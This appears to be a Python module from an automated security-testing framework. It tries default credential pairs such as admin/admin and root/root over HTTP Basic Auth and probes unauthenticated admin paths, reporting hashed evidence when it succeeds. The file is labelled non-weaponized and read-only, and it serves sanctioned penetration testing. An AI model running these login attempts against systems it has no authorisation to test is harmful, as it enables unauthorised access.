"""Authentication bypass PoC probe skeleton.

Read-only probe that attempts default credentials via HTTP Basic Auth and
probes unauthenticated admin paths.  Success is determined by HTTP 200 plus
the presence of admin/config/management content tokens.

Non-weaponized: No file modifications, no service disruption.
Uses only stdlib http.client.  All evidence includes a SHA-256 readback hash.
"""
from __future__ import annotations

import base64
import hashlib
import http.client
from datetime import datetime, timezone

from poc_skeletons.interface import PoCResult


def _utc_now() -> str:
    return (
        datetime.now(tz=timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )


class PoC:
    chain_id = "skeleton:auth_bypass"
    target_service = "http"

    _DEFAULT_CREDS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("root", "root"),
        ("admin", ""),
        ("root", ""),
    ]
    _ADMIN_PATHS = [
        "/admin/",
        "/management/",
        "/cgi-bin/admin.cgi",
        "/config/",
    ]
    _SUCCESS_TOKENS = [b"admin", b"config", b"management", b"dashboard"]

    def setup(
        self,
        target_ip: str,
        target_port: int,
        *,
        context: dict[str, object],
    ) -> None:
        self.target_ip = target_ip
        self.target_port = target_port
        self.context = context

    def execute(self) -> PoCResult:
        timestamp = _utc_now()
        evidence_prefix = (
            "autopoc_mode=deterministic_nonweaponized "
            f"chain_id={self.chain_id} probe=auth_bypass"
        )

        # Phase 1: default credentials via HTTP Basic Auth
        for user, passwd in self._DEFAULT_CREDS:
            try:
                conn = http.client.HTTPConnection(
                    self.target_ip, int(self.target_port), timeout=3.0
                )
                cred = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                conn.request(
                    "GET", "/", headers={"Authorization": f"Basic {cred}"}
                )
                resp = conn.getresponse()
                body = resp.read(4096)
                conn.close()
                digest = hashlib.sha256(body).hexdigest()
                if resp.status == 200 and any(
                    t in body.lower() for t in self._SUCCESS_TOKENS
                ):
                    evidence = (
                        evidence_prefix
                        + f" port={self.target_port} cred={user}:***"
                        + f" status={resp.status} bytes={len(body)}"
                        + f" readback_hash={digest}"
                    )
                    return PoCResult(
                        success=True,
                        proof_type="shell",
                        proof_evidence=evidence,
                        timestamp=timestamp,
                    )
            except Exception:
                continue

        # Phase 2: unauthenticated admin paths
        for admin_path in self._ADMIN_PATHS:
            try:
                conn = http.client.HTTPConnection(
                    self.target_ip, int(self.target_port), timeout=3.0
                )
                conn.request("GET", admin_path)
                resp = conn.getresponse()
                body = resp.read(4096)
                conn.close()
                digest = hashlib.sha256(body).hexdigest()
                if resp.status == 200 and any(
                    t in body.lower() for t in self._SUCCESS_TOKENS
                ):
                    evidence = (
                        evidence_prefix
                        + f" port={self.target_port} path={admin_path}"
                        + f" status={resp.status} bytes={len(body)}"
                        + f" readback_hash={digest}"
                    )
                    return PoCResult(
                        success=True,
                        proof_type="arbitrary_read",
                        proof_evidence=evidence,
                        timestamp=timestamp,
                    )
            except Exception:
                continue

        evidence = (
            evidence_prefix
            + f" port={self.target_port} bytes=0 readback_hash=none"
            + " result=no_auth_bypass_confirmed"
        )
        return PoCResult(
            success=False,
            proof_type="arbitrary_read",
            proof_evidence=evidence,
            timestamp=timestamp,
        )

    def cleanup(self) -> None:
        return
